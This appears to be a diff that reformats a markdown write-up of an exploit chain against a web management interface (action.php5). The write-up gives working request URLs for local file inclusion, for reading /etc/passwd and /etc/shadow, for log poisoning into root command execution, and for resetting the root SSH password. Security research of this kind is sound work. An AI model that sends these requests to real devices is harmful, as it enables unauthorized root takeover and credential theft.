@@ -26,7 +26,7 @@ It's possible earlier version are affected, I was only able to review 5.1r5 brie
 Of particular interest was the LFI vulnerability and the tantalizing "maybe you can leverage this further."
 With every intent to leverage this further, I tested the example LFI from the exploit-db page:
 
-http://<IP>/action.php5?_action=get&_actionType=1&_page=php://filter/convert.base64-encode/resource=ManagementAP
+> http://<IP>/action.php5?_action=get&_actionType=1&_page=php://filter/convert.base64-encode/resource=ManagementAP
 
 This returned the ManagementAP PHP page as promised. Great!
 The only problem was that the web server was appending ".php" to any other file that we tried to read.
@@ -34,17 +34,17 @@ We can fix this by adding a null byte "%00" to the end of the filename since the
 an old version of PHP.
 
 Now we can read arbitrary files like /etc/passwd with:
-http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../etc/passwd%00
+> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../etc/passwd%00
 
 We can also see the shadow file with:
-http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../etc/shadow%00
+> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../etc/shadow%00
 
 Great! The web server is running as a privileged user. I tried cracking the hashes for around 30 minutes with John to no avail.
 Your mileage may vary. In any case, this was a dead end that I put off till later if I couldn't find another way in.
 
 ## Post Exploitation
 We can also see the system boot/error logs with:
-http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00
+> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00
 
 After reading /var/log/messages I noticed that it was logging usernames with something like:
 
@@ -67,7 +67,7 @@ I used this one: http://snipplr.com/view/72936/simple-php-backdoor-shell/
 I entered gibberish as the password, then hit enter.
 
 Browsing to the LFI for /var/log/messages again with the following URL and ...
-http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd=whoami
+> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd=whoami
 
 Viewing source for the page and searching for "whoami" and we see that it worked! The web server process is running as the root user.
 
@@ -76,11 +76,9 @@ Viewing source for the page and searching for "whoami" and we see that it worked
 Now, how to get a reverse shell? There are lots of methods out there for running netcat, telnet, fifo shells, etc.
 I chose to go the simple route and just reset the root SSH password with:
 
-http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd=echo+root:password+|+/usr/sbin/chpasswd
+> http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd=echo+root:password+|+/usr/sbin/chpasswd
 
 https://imgur.com/a/YT8Pw
-
-> echo root:password | /usr/sbin/chpasswd
 
 Will change the root password for SSH to "password"
 
